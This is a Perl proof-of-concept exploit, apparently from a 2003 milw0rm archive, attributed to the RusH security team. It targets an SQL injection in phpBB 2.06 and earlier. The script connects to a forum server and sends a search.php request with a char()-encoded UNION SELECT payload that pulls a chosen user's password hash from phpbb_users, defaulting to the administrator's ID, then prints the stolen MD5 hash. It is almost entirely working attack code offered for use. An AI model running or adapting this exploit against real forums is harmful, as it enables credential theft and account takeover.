#!/usr/bin/perl -w
use IO::Socket;
##    PROOF-OF-CONCEPT
##    * work only with mysql ver > 4.0
##    * work only with post #1 
##
##    Example:
##    C:\>r57phpbb-poc.pl 127.0.0.1 phpBB2 2 2
##    [~] prepare to connect...
##    [+] connected
##    [~] prepare to send data...
##    [+] OK
##    [~] wait for response...
##    [+] MD5 Hash for user with id=2 is: 5f4dcc3b5aa765d61d8327deb882cf99
##
if (@ARGV < 4)
{
print "\n\n";
print "|****************************************************************|\n";
print " r57phpbb.pl\n";
print " phpBB v<=2.06 search_id sql injection exploit (POC version)\n";
print " by RusH security team // www.rsteam.ru , http://rst.void.ru\n";
print " coded by f3sy1 & 1dt.w0lf // 16/12/2003\n";
print " Usage: r57phpbb-poc.pl <server> <folder> <user_id> <search_id>\n";
print " e.g.: r57phpbb-poc.pl 127.0.0.1 phpBB2 2 2\n";
print " [~] <server> - server ip\n";
print " [~] <folder> - forum folder\n";
print " [~] <user_id> - user id (2 default for phpBB admin)\n";
print " [~] <search_id> - play with this value for results\n";
print "|****************************************************************|\n";
print "\n\n";
exit(1);
}
$success = 0;
$server = $ARGV[0];
$folder = $ARGV[1];
$user_id = $ARGV[2];
$search_id = $ARGV[3];
print "[~] prepare to connect...\n";
$socket = IO::Socket::INET->new(
Proto => "tcp",
PeerAddr => "$server",
PeerPort => "80") || die "$socket error $!";
print "[+] connected\n";
print "[~] prepare to send data...\n";
# PROOF-OF-CONCEPT reguest...
print $socket "GET /$folder/search.php?search_id=$search_id%20union%20select%20concat
(char(97,58,55,58,123,115,58,49,52,58,34,115,101,97,114,99,104,95,114,101,115,117,108,
116,115,34,59,115,58,49,58,34,49,34,59,115,58,49,55,58,34,116,111,116,97,108,95,109,
97,116,99,104,95,99,111,117,110,116,34,59,105,58,53,59,115,58,49,50,58,34,115,112,108,
105,116,95,115,101,97,114,99,104,34,59,97,58,49,58,123,105,58,48,59,115,58,51,50,58,34)
,user_password,char(34,59,125,115,58,55,58,34,115,111,114,116,95,98,121,34,59,105,58,48,
59,115,58,56,58,34,115,111,114,116,95,100,105,114,34,59,115,58,52,58,34,68,69,83,67,34,
59,115,58,49,50,58,34,115,104,111,119,95,114,101,115,117,108,116,115,34,59,115,58,54,
58,34,116,111,112,105,99,115,34,59,115,58,49,50,58,34,114,101,116,117,114,110,95,99,
104,97,114,115,34,59,105,58,50,48,48,59,125))%20from%20phpbb_users%20where%20user_id=$user_id/*
HTTP/1.0\r\n\r\n";
print "[+] OK\n";
print "[~] wait for response...\n";
while ($answer = <$socket>)
{
if ($answer =~ /;highlight=/)
{
$success = 1;
@result=split(/;/,$answer);
@result2=split(/=/,$result[1]);
$result2[1]=~s/&amp/ /g;
print "[+] MD5 Hash for user with id=$user_id is: $result2[1]\n";
}
}
if ($success==0) {print "[-] exploit failed =(\n";}
## o---[ RusH security team | www.rsteam.ru | 2003 ]---o


# milw0rm.com [2003-12-21]
